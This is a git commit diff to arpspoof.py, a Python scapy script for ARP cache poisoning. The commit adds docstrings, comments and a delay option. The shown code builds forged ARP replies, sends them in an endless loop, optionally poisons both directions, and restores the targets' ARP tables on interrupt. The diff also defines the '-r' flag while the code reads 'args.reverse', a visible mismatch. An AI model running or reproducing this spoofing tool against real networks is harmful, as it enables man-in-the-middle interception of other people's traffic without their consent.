0aab4b87df19deea2e09aabe5df6f7d45e367c72
omega-coder <fy_cherief@esi.dz>
2019-07-17 14:44:31 +0200

    Adds doumentation to script

--- arpspoof.py
+++ arpspoof.py
@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
 
@@ -13,7 +13,7 @@ from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp
 
 __author__ = "omega_coder"
 __email__ = "yacine@octodet.com"
-__first_release__ = "October 2015"
+__created__ = "October 2015"
 __version__ = "v1.0"
 
 
@@ -28,6 +28,7 @@ def parse_args():
     parser.add_argument("-i", "--interface", type=str, help="Interface to send arp replay's on!")
     parser.add_argument("host", type=str, help="The host")
     parser.add_argument("-r", action="store_true", help="poison both ways!!")
+    parser.add_argument("-d", "--delay", type=int, help="Delay to send arp replies (Default. 5 seconds)", default=5)
     args = parser.parse_args()
     return args
 
@@ -39,6 +40,9 @@ def p_success(string):
     print("\033[1;32;40m{}\033[0;37;40m".format(string))
 
 def spoof():
+    """main spoofing function
+    """
+    
     disable_ipv6_error()
     args = parse_args()
     if os.geteuid() != 0:
@@ -49,6 +53,12 @@ def spoof():
     if_mac = get_if_hwaddr(args.interface)
     interface = args.interface
     def make_reply_packet(target, host):
+        """Make an ARP reply packet.
+        
+        Arguments:
+            target {string} -- target ip address
+            host {string} -- host ip address
+        """
         if target is None:
             pkt = Ether(src=if_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(hwsrc=if_mac, psrc=host, op=2)
         else:
@@ -61,6 +71,12 @@ def spoof():
 
 
     def rearp_targets(signal, frame):
+        """Function to rearp targets when SIGNINT signal is fired.
+        
+        Arguments:
+            signal {signal} -- Signal
+            frame {frame} -- Stack frame or execution frame
+        """
         sleep(1)
         p_success("\n[+] Rearping Targets")
         r_mac = getmacbyip(host)
@@ -73,22 +89,22 @@ def spoof():
             sendp(r_pkt, inter=1, count=2, iface=interface)
         p_success("[+] Exiting!")
         sys.exit(0)
-
+    
+    # handle SIGINT signal using rearp_target handler
     signal.signal(signal.SIGINT, rearp_targets)
 
-
+    # Build ARP reply packet.
     pkt = make_reply_packet(args.target, host)
 
-    # if we are poisoning in both ways
+    # handle poisoning in both ways!!
     if args.reverse:
         r_pkt = make_reply_packet(host, args.target)
 
 
     while True:
-        sendp(pkt, inter=30, iface=interface)
+        sendp(pkt, inter=args.delay, iface=interface)
         if args.reverse:
-            sendp(r_pkt, inter=30, iface=interface)
-
+            sendp(r_pkt, inter=args.delay, iface=interface)
 
 if __name__ == "__main__":
     spoof()
